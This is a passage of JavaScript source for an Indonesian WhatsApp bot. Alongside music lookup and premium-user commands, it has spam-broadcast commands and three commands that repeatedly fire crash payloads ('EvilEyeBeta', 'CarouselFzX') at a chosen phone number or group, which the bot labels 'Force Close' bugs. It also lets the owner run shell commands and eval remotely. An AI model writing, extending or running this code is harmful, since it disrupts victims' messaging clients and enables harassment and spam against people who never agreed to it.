case "play":{
            if (!isOwner) return reply('Owner Only');
                if (!text) return reply(`\n*Example :* ${command} Impossible\n`)
                reply(`*Searchingg...*`)
                let mbut = await fetchJson(`https://joocode.zone.id/api/music?query=${text}`)
                let ahh = mbut.result
                let crot = ahh.download.audio

                Noct.sendMessage(m.chat, {
                    audio: { url: crot },
                    mimetype: "audio/mpeg", 
                    ptt: true
                }, { quoted: fnoct })
            }
            break

case "addprem":{
if (!isOwner) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿")
if (!args[0]) return reply(`*\`User :\`* *${command} Number*\n*\`Example :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Noct.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*The number not register*`)
Premium.push(prrkek)
fs.writeFileSync("./data/user.json", JSON.stringify(Premium))
reply(`*Succes add*`)
}
break
case "listprem": {
  if (!isOwner) return reply("𝗞𝗵𝘂𝘀𝘂𝘀 𝗢𝘄𝗻𝗲𝗿");

  let murbug = JSON.parse(fs.readFileSync("./data/user.json"));
  if (murbug.length === 0) return reply("Belum ada nomor yang menjadi premium.");

  let teks = "*List Premium:*\n\n";
  teks += murbug.map((v, i) => `${i + 1}. wa.me/${v.replace(/@s\.whatsapp\.net$/, "")}`).join("\n");

  reply(teks);
}
break;
case "getq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
reply(jsonData)
} 
break
case "addch": {
    if (!isOwner) return reply("Owner Only!");
    if (!text) return reply("Enter Your Link Channel");

    if (!text.includes("https://whatsapp.com/channel/")) 
        return reply("Link channel tidak valid!");

    let code = text.split("https://whatsapp.com/channel/")[1].trim();

    try {
        let res = await Noct.newsletterMetadata("invite", code);
        if (!res || !res.id) return reply("Gagal mengambil ID channel!");

        let channelId = res.id;

        const adminList = readAdmin();
        if (adminList.includes(channelId)) 
            return reply("Channel sudah terdaftar!");

        adminList.push(channelId);
        writeAdmin(adminList);

        reply(`Berhasil menambahkan Channel ke admin.json:\n${channelId}`);
    } catch (err) {
        console.error(err);
        reply(`Gagal convert link channel:\n${err.message}`);
    }
}
break;

case "jpmchcd": {
  if (!isPremium) return reply("Khusus Premium!");
  if (!text.includes("|")) return reply("Input : Message|1000 (Delay ms)");

  const [pesan, delayStr] = text.split("|");
  const delay = parseInt(delayStr.trim());

  const now = Date.now();
  if (now - global.lastRun < global.antri) {
    const tunggu = ((global.antri - (now - global.lastRun)) / 1000).toFixed(1);
    return reply(`Sedang ada antrian, coba lagi dalam ${tunggu} detik`);
  }

  global.lastRun = now;
  const adminList = readAdmin();
  if (adminList.length === 0) return reply("Belum ada id di admin.json");

  reply(`Proses kirim pesan ke ${adminList.length} channel...`);

  (async () => {
    for (let id of adminList) {
      await Noct.sendMessage(id, { text: pesan }, { quoted: m });
      await new Promise(res => setTimeout(res, delay));
    }
    reply("Done broadcast dengan cooldown.");
  })();
  break;
}

case "jpmchnocd": {
  if (!isPremium) return reply("Khusus Premium!");
  if (!text) return reply("Format: .Jpmchnocd pesan");

  const now = Date.now();
  if (now - global.lastRun < global.antri) {
    const tunggu = ((global.antri - (now - global.lastRun)) / 1000).toFixed(1);
    return reply(`Sedang ada antrian, coba lagi dalam ${tunggu} detik`);
  }

  global.lastRun = now;
  const adminList = readAdmin();
  if (adminList.length === 0) return reply("Belum ada id di admin.json");

  reply(`Proses kirim pesan ke ${adminList.length} channel (no cooldown)...`);

  for (let id of adminList) {
    Noct.sendMessage(id, { text: text }, { quoted: m });
  }

  reply("Done broadcast tanpa cooldown.");
  break;
}



case "fpsfc": {
    if (!isOwner && !isPremium) return reply("Owner Only")
    if (!text) return reply(`Contoh: .${command} 628xxxxxx`);

    const isTarget = text + '@s.whatsapp.net';
    await reply(`Proccesing Sending Bug
──────────
To : ${isTarget}
Status : Procces
Type : Force Close`);

    for (let i = 0; i < 100; i++) {
        await EvilEyeBeta(Noct, isTarget);
        await new Promise(res => setTimeout(res, 300));
    }

    await reply(`Succesfuly Sending Bug 
──────────
To : ${isTarget}
Status : Succes
Type : Force Close`);
}
break;
case "carousel": {
    if (!isOwner && !isPremium) return reply("Owner Only")
    if (!text) return reply(`Contoh: .${command} 628xxxxxx`);

    const isTarget = text + '@s.whatsapp.net';
    await reply(`Proccesing Sending Bug
──────────
To : ${isTarget}
Status : Procces
Type : Force Close`);

    for (let i = 0; i < 10; i++) {
        await CarouselFzX(isTarget);
        await new Promise(res => setTimeout(res, 300));
    }

    await reply(`Succesfuly Sending Bug 
──────────
To : ${isTarget}
Status : Succes
Type : Force Close`);
}
break;

case "carouselfzx": {
  if (!isOwner && !isPremium) return reply("Owner Only");

  let targetJid;

  if (!text) {
    targetJid = m.chat;
  } else {
    const raw = text.trim();

    if (raw.endsWith('@s.whatsapp.net') || raw.endsWith('@g.us')) {
      targetJid = raw;
    } else if (/^\d+$/.test(raw)) {
      targetJid = raw + '@s.whatsapp.net';
    } else if (raw.includes('-')) {
      targetJid = raw + '@g.us';
    } else {
      targetJid = m.chat;
    }
  }

  await reply(`X`);

  try {
    for (let i = 0; i < 10; i++) {
      await CarouselFzX(targetJid);
      await new Promise(res => setTimeout(res, 300));
    }

    await reply(`Successfully Sending Bug
──────────
To : ${targetJid}
Status : Success
Type : Force Close`);
  } catch (err) {
    console.error('Failed:', err);
    await reply(`Failed : ${err.message || err}`);
  }
}
break;

// 𝐄 𝐍 𝐃    𝐂 𝐀 𝐒 𝐄
default:
if ((m.text).startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Noct.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Noct.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}


if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Noct.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Noct.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}


if (m.text.startsWith(">")) {
  if (!isOwner) return;
  try {
    let result = await eval(`(async () => { ${m.text.slice(1)} })()`)
    if (typeof result !== 'string') result = require("util").inspect(result)
    m.reply(result)
  } catch (err) {
    m.reply(String(err))
  }
}


}} catch (e) {
console.log(e)
Noct.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}


process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})